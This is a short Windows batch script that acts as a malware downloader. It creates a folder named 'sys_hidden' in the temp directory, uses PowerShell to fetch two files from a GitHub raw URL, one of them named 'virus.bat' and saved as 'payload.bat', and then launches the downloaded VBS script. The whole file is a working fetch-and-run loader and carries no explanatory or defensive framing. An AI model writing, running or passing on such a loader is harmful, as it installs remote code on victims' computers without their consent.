@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

set "VBS_URL=https://raw.githubusercontent.com/Ayamet/web/main/main/vbs.vbs"
set "BAT_URL=https://raw.githubusercontent.com/Ayamet/web/main/main/virus.bat"

set "DEST_DIR=%TEMP%\sys_hidden"
set "VBS_PATH=%DEST_DIR%\run.vbs"
set "BAT_PATH=%DEST_DIR%\payload.bat"

if not exist "%DEST_DIR%" (
    mkdir "%DEST_DIR%"
)


powershell -Command "Invoke-WebRequest -Uri '%BAT_URL%' -OutFile '%BAT_PATH%' -UseBasicParsing"
powershell -Command "Invoke-WebRequest -Uri '%VBS_URL%' -OutFile '%VBS_PATH%' -UseBasicParsing"

start "" "%VBS_PATH%"
exit /b
